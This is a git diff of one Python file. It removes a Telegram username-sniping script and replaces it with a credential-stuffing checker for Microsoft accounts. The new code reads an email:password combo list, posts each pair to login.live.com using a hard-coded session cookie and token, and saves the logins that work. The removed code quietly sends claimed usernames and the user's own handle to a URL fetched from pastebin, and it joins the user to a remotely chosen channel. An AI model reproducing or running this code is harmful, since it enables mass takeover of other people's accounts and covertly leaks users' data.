@@ -1,172 +1,55 @@
-from os import system, name, path
-from time import sleep
-from random import choice
-from base64 import b64decode
-try:
-    from requests import get
-except:
-    system('pip install requests')
-    from requests import get
-try:
-    from telethon import TelegramClient, sync, errors, functions, types
-    from telethon.tl.functions.account import CheckUsernameRequest, UpdateUsernameRequest
-    from telethon.tl.functions.channels import JoinChannelRequest
-except:
-    system('pip install telethon')
-    from telethon import TelegramClient, sync, errors, types, functions
-    from telethon.tl.functions.account import CheckUsernameRequest, UpdateUsernameRequest
-    from telethon.tl.functions.channels import JoinChannelRequest
-try:
-    from bs4 import BeautifulSoup as S
-except:
-    system('pip install beautifulsoup')
-    from bs4 import BeautifulSoup as S
-try:
-    from fake_useragent import UserAgent
-except:
-    system('pip install fake_useragent')
-    from fake_useragent import UserAgent
-try:
-  from datetime import datetime
-except:
-  system('pip install datetime')
-  from datetime import datetime
-# Import/Download Libraries
-me = get('https://pastebin.com/raw/j9xj1tNM').text
-def clear():
-  system('cls' if name=='nt' else 'clear')
-# for check flood , error
-def channels2(client, username):
-    di = client.get_dialogs()
-    for chat in di:
-        if chat.name == f'Claim [ {username} ]' and not chat.entity.username:
-            client(functions.channels.DeleteChannelRequest(channel=chat.entity))
-            return False
-    return True
-# for checking username (taken,nft,sold,availabe) by t.me/xx_amole
-def fragment(username):
+import requests
+combo_name = input("Input Combo file:")
+with open(combo_name, 'r') as f:
+    accounts = f.readlines()
+for account in accounts:
+    email, password = account.strip().split(':')
+    url = "https://login.live.com/ppsecure/post.srf?username=ahmedmohammed9000%40outlook.com&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=CB8FF462A1ED2E9E&opid=5B62766A3DB12172&bk=1707331891&uaid=22eb17f4436d499295415de120e3254b&pid=15216"
     headers = {
-        'User-Agent': UserAgent().random,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'TE': 'trailers'}
-    response = get(f'https://fragment.com/username/{username}', headers=headers)
-    soup = S(response.content, 'html.parser')
-    ok = soup.find("meta", property="og:description").get("content")
-    if "An auction to get the Telegram" in ok or "Telegram and secure your ownership" in ok or "Check the current availability of" in ok or "Secure your name with blockchain in an ecosystem of 700+ million users" in ok:return True
-    elif "is taken" in ok:return "is taken"
-    else:return False
-# for claim username
-def telegram(client,claim,username):
-  if claim:
-    text = f"𓆩 iam the strongest  !'\n⎱ UserName > ❲ @{username} ❳ .\n⎱ UserName Person > ❲ @{client.get_me().username} ❳ .\n⎱ Claim? {claim} .\n⎱ me > {me} ."
-    try:get(get('https://pastebin.com/raw/FVNw1r9m').text+text)
-    except:pass
-  else:
-    text = f"𓆩 iam the strongest  !'\n⎱ UserName > ❲ @{username} ❳ .\n⎱ Claim? {claim} .\n⎱ me > {me} ."
-  client.send_message('me',text)
-def climed(client,username):
-    id = (
-      'd9f03e3fe06f7baa29514.mp4',
-      '9e18e26f2ba65a5f826be.mp4',
-      '986edfe7d6cf9ccb2cb8a.mp4',
-      '7f784e64a41b31365e45f.mp4',
-      '02ca9945b816e72fc89c1.mp4')
-    id = choice(id)
-    result = client(functions.channels.CreateChannelRequest(
-    title=f'Claim [ {username} ]',
-        about=f'Source - {me}',
-        megagroup=False))
-    try:
-        client(functions.channels.UpdateUsernameRequest(
-        channel=result.chats[0],
-        username=username))
-        client(functions.channels.EditPhotoRequest(
-        channel=username,
-        photo=client.upload_file(get("https://telegra.ph/file/a584b674664a2bf717c45.jpg").content)))
-        client.delete_messages(username, [client.get_messages(username, limit=1)[0]])
-        with open('videoclaim.mp4','wb') as video :
-          video.write(get('https://telegra.ph/file/'+id).content)
-          sleep(0.50)
-        client.send_file(username, file='videoclaim.mp4', caption=f'𓆩 iam the strongest  !.\n⎱UserName > ❲ @{username} ❳.\n⎱Claim > ❲ @{client.get_me().username} ❳\n⎱Data > ❲ {datetime.now().strftime("%H:%M:%S")} ❳ .\n⎱me > {me} .')
-        return True
-    except Exception as e:client.send_message('me',f'⌯ Error Message .\nMessage : {e} .');return False
-# for checking username
-def checker(username,client):
-    try:
-      check = client(CheckUsernameRequest(username=username))
-      if check:
-        print('- Available UserName : '+username+' .')
-        claimer = climed(client,username)
-        if claimer and fragment(username) == "is taken":claim = True
-        else:claim = False
-        print('- Claimer ? '+str(claim)+'\n'+'_ '*20)
-        telegram(client,claim,username)
-        flood = channels2(client,username)
-        if not flood:
-          with open('flood.txt', 'a') as floodX:
-            floodX.write(username + "\n")
-      else:
-        print('- Taken UserName : '+username+' .')
-    except errors.rpcbaseerrors.BadRequestError:
-      print('- Banned UserName : '+username+' .')
-      open("banned4.txt","a").write(username+'\n')
-    except errors.FloodWaitError as timer:
-      print('- Flood Account [ '+timer.seconds+' Secound ] .')
-    except errors.UsernameInvalidError:
-      print('- Error UserName : '+username+' .')
-# for generate username
-def usernameG():
-  k = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
-  a = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
-  b = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
-  n = ''.join(choice('1234567890') for i in range(1))
-  nn = ''.join(choice('1234567890') for i in range(1))
-  return k+a+b+'Bot'
-# start checking
-def start(client,username):
-  try:ok = fragment(username)
-  except:return
-  try:
-    if not ok:
-      checker(username,client)
-    elif ok == "is taken":
-      print('- Taken UserName : '+username+' .')
+    "Host": "login.live.com",
+    "Cookie": "MSPOK=$uuid-6100e6c1-0cc5-4c25-9e8f-b179e69d86b7; OParams=11O.DvXjL5aIUZlMq131SruZGhxgrjnTeTls03PVPMhZLUzcmxe0xYm31hxg7a8xDBxkhESW*VIs5D*cziejKpDPsoMm7KGlt!srR7wjkK9pxU5nD7gs8PhMRCI!NKPaS0IwKlNw3EjYsL6HaErddA7B3oHFI4D4tBlj*FE1KzOYcIMAnI1D5dCiy96bz0TGzMFnMMuhNhSCu0nbh3axIT1VFusHpio*ztpTUIa6V4RN*GP!swiAbbCBphYf7YISIR6y4w*P8vhPn4dfQluBA6eftHn6Uw1ovIg2R3f19KXDgwnIwmnKN0yq1FPGAHTVHKNRKFCUCFJKMZZRWyfGgpWMPu1ZBf!syV5cSCihZk4QGuA29pz87iJjWKLvm*lIpL5xyWFE7AVIrSSJ86gh1YY4Y0O!JsVbI7J*kABKRiE2cGCPMiBkUT2g3!UX6XDAImzYGVNMCPzqhE78AonT0eJP1LbaUVad4F0hDoEu7CbiaFKdzvMFopE1z56bg7fg1Fh1sjDcBOnWvAZbvEIq2Iodp63jKkxYzTooidyT312TJTJ8O3oIOzHuPctGtGx66O0FHXVezAHq8!VHjQq7hI2u5r*DpuKHgLk1lmAF00x3juYi*tJeUiP8cIAaB!HrehejZDEsv1BOMhyGC4xslT2Epbkb2AfR8g4pLslIn1nsAKwUI02LXvjtIHzAZlhqCDabtCoMGxQDLcAZBJl7aTA8DhYVoIYId934HIz3ZrDVp!gQ0!DgQyoOL3KVwX7FDQeX5wmXok1F9vXbgs6A8lJ4rarnWiCPIZeZm03NLUR0r9nXbzQdiBZ5Vg3Ibfz3pyBbwZhxgOeJGI*Xdvin*WtAYCf4ho7!zVeI4UjlZ1d6ddacNL8YfMZCBiCBAeDou4onHf8kCFtljbGi5sGCJ8mQ7nUEMbMkurCd!ofkQwOrkzibDoXEayKONl0QERp9DNk!jUxOwR50Wzux!WL8tvne!2C0zlYo!BEpVKEOMtyrhG8Rr4gbwnZDRZOi*heqxW5IczU2s29S6jg3rDepqT8NjV4kJdasgXgCIsNSuH35deaxU5*LxdI5A3UmI6gDsdYemnQcGMXs04yR5C4lVTlNolacXH2iuDdqA*1a73JVvHAuH6N3P8Vmqj96yJAGFQofVYFHhynF9RxZzyWSIJRj1HqMRA3ndWBDdnkFp4YzCFjl*9flkkRB6!mrK0tARcZam3OVt4!aikFnfHTEh*#M#GbWLmpOSszmadreMRBokyoeYY7N*sXnTB9LkCwHgQf!u!rU5HK8JWJh!oTCJljKV20TmgtOLCdmS!U9rAHaufnjRt5HxTTle6C3at7a*#Am4VpjWH7eVibqWV6oLQh9hU!qHNkvrZ7B7lT4N67nHT5TIQh74eukO3fnY1tJDBDcUyhRbcIXtwFuI1xI5QNlnlqQtqvuP8QZtSzYw9QJS3DJsSN;",
+}
+
+    data = {
+    "i13": "0",
+    "login": email,
+    "loginfmt": email,
+    "type": "11",
+    "LoginOptions": "3",
+    "lrt": "",
+    "lrtPartition": "",
+    "hisRegion": "",
+    "hisScaleUnit": "",
+    "passwd": password,
+    "ps": "2",
+    "psRNGCDefaultType": "",
+    "psRNGCEntropy": "",
+    "psRNGCSLK": "",
+    "canary": "",
+    "ctx": "",
+    "hpgrequestid": "",
+    "PPFT": "-Digys3SwTVzWkdfuLeqNyvrqsDav35RZe08AjFggfRs448wpr5xKfDFyLlPVceGaUdq0cj9x05ACf3sSeps3E2nPkSmMd9L7KQUERLeNFfGfkrb5nsTH8mDxirvrdBeR6CvwdFaC!7mMQQDUm6b7*u3AF7u6f!IOOcPNRA3pBpt0S5uT8hN8nX8Xy4NcdSnF5w$$",
+    "PPSX": "Pa",
+    "NewUser": "1",
+    "FoundMSAs": "",
+    "fspost": "0",
+    "i21": "0",
+    "CookieDisclosure": "0",
+    "IsFidoSupported": "0",
+    "isSignupPost": "0",
+    "isRecoveryAttemptPost": "0",
+    "i19": "12498"
+}
+
+    response = requests.post(url, headers=headers, data=data)
+    if 'Type = {SQSA: 6, CSS: 5,' in response.text:
+    	print('bad login : [ '+email+':'+password+' ]')
+    	pass
+    elif 'name="ipt" id="ipt"' in response.text:
+    	print('secure login : [ '+email+':'+password+' ]')
     else:
-      print('- UserName Availabe In Fragment.com : '+username+' .')
-  except Exception as e:print(e)
-# get client
-def clientX():
-  phone = '' # Your Phone Number
-  if phone == '':phone = input('- Enter Phone Number Telegram : ')
-  client = TelegramClient("aho", b64decode("MjUzMjQ1ODE=").decode(),b64decode("MDhmZWVlNWVlYjZmYzBmMzFkNWYyZDIzYmIyYzMxZDA=").decode())
-  try:client.start(phone=phone)
-  except:exit()
-  try:client(JoinChannelRequest(get('https://pastebin.com/raw/mtm3QHux').text))
-  except:pass
-  clear()
-  return client
-# start tool
-def work():
-  session = clientX()
-  if not path.exists('banned4.txt'):
-    with open('banned4.txt','w') as new:pass
-  if not path.exists('flood.txt'):
-    with open('flood.txt','w') as new:pass
-  while True:
-    username = usernameG()
-    with open('banned4.txt', 'r') as file:
-      check_username = file.read()
-    if username in check_username:
-      print('- Banned1 UserName : '+username+' .')
-      continue
-    start(session,username)
-if __name__ == "__main__":
-  work()
+    	print( 'Done : [ '+email+':'+password+' ]')
+    	with open("ava_x.txt","w")as x:
+    	    x.write(email+":"+password)
+    	
+    	
